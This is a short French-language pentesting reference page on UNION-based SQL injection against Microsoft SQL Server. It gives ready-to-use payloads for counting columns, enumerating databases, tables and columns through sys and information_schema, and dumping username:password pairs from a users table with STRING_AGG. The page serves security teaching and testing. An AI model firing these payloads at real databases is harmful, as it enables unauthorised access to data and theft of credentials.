---
order: 11
title: "Injection SQL basée sur UNION dans MSSQL"
description: "Utiliser UNION SELECT dans SQL Server pour extraire des données : détecter le nombre de colonnes, faire correspondre les types et lire le catalogue sys et information_schema."
keywords:
  - injection SQL basée sur union
  - UNION SELECT MSSQL
  - sys.tables
  - information_schema
  - STRING_AGG
---

# Basée sur UNION

Un `UNION SELECT` ajoute des lignes choisies par l'attaquant à un jeu de résultats retourné. SQL Server rejoint MySQL dans l'esprit mais est strict sur les types, donc chaque colonne injectée doit correspondre au type d'origine ou être `NULL` (qui convient à n'importe quel type).

Détectez le nombre de colonnes avec les ordinaux d'`ORDER BY` ou un `UNION SELECT NULL` incrémental :

```sql
' ORDER BY 3-- 
' UNION SELECT NULL,NULL,NULL-- 
```

`ORDER BY` échoue au-delà du nombre réel, et la liste de `NULL` qui cesse de lever `All queries ... must have an equal number of expressions` est le nombre. Remplacez un `NULL` par une valeur pour trouver la colonne reflétée.

Énumérez via le catalogue `sys` ou `information_schema`. Listez les bases, puis les tables, puis les colonnes :

```sql
' UNION SELECT name,NULL,NULL FROM sys.databases-- 
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- 
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- 
```

Regroupez plusieurs lignes dans une seule cellule avec `STRING_AGG()` sur SQL Server 2017 et versions ultérieures, ou l'astuce `FOR XML PATH('')` sur les versions plus anciennes :

```sql
' UNION SELECT STRING_AGG(name,','),NULL,NULL FROM sys.tables-- 
' UNION SELECT (SELECT name+',' FROM sys.tables FOR XML PATH('')),NULL,NULL-- 
```

Puis extrayez les lignes, en concaténant avec `+` et en convertissant si nécessaire :

```sql
' UNION SELECT STRING_AGG(username+':'+password,CHAR(10)),NULL,NULL FROM users-- 
```

Il n'y a pas de `LIMIT` ; utilisez `TOP n` ou `OFFSET ... FETCH` quand vous avez besoin d'une seule ligne (par exemple `SELECT TOP 1 name FROM sys.tables`).

## Outils

- **sqlmap** : détection et extraction automatisées basées sur union.
- **sqlcmd** : client officiel pour confirmer directement les requêtes de catalogue.

## Références

- Microsoft SQL Server Documentation: UNION, system catalog views, STRING_AGG, FOR XML
- OWASP Testing Guide: Testing for SQL Injection
